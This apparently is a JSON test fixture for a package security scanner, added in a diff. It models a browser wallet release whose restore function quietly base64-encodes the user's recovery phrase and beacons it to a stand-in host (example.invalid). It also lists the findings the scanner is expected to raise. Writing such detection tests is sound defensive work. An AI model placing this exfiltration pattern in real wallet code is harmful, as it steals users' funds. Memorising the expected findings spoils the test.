@@ -1,0 +1,74 @@
+{
+  "id": "mnemonic-beacon-query-exfil",
+  "title": "Wallet restore flow beacons the recovery phrase out in a query string",
+  "category": "network-exfil",
+  "intent": "Models a mnemonic stealer spliced into a browser wallet's restore flow: the phrase is rejoined, base64-encoded into URLSearchParams, concatenated into a pixel URL through two intermediate variables and sent with navigator.sendBeacon. The flow rule must follow the value through each assignment and the data-preserving toString() and fire high on the beacon. Safe: host is example.invalid and no phrase value exists.",
+  "previousPackageJson": {
+    "name": "mnemonic-beacon-query-exfil",
+    "version": "0.9.4",
+    "main": "dist/restore.js"
+  },
+  "stagedPackageJson": {
+    "name": "mnemonic-beacon-query-exfil",
+    "version": "0.9.5",
+    "main": "dist/restore.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 81,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"mnemonic-beacon-query-exfil\",\"version\":\"0.9.4\",\"main\":\"dist/restore.js\"}"
+    },
+    {
+      "path": "dist/restore.js",
+      "size": 186,
+      "sha256": "restore-before",
+      "flags": [],
+      "textSample": "export function restoreFromPhrase(phrase) {\n  const words = phrase.trim().split(/\\s+/);\n  return deriveWallet(words);\n}\nfunction deriveWallet(words) {\n  return { size: words.length };\n}\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 81,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"mnemonic-beacon-query-exfil\",\"version\":\"0.9.5\",\"main\":\"dist/restore.js\"}"
+    },
+    {
+      "path": "dist/restore.js",
+      "size": 402,
+      "sha256": "restore-after",
+      "flags": [],
+      "textSample": "export function restoreFromPhrase(phrase) {\n  const words = phrase.trim().split(/\\s+/);\n  const seedPhrase = words.join(' ');\n  const params = new URLSearchParams({ v: '2', p: btoa(seedPhrase) });\n  const target = 'https://example.invalid/pixel.gif?' + params.toString();\n  navigator.sendBeacon(target);\n  return deriveWallet(words);\n}\nfunction deriveWallet(words) {\n  return { size: words.length };\n}\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "dist/restore.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "dist/restore.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "dist/restore.js"
+    },
+    {
+      "ruleId": "code.key-material-exfiltration",
+      "severity": "high",
+      "file": "dist/restore.js"
+    }
+  ]
+}
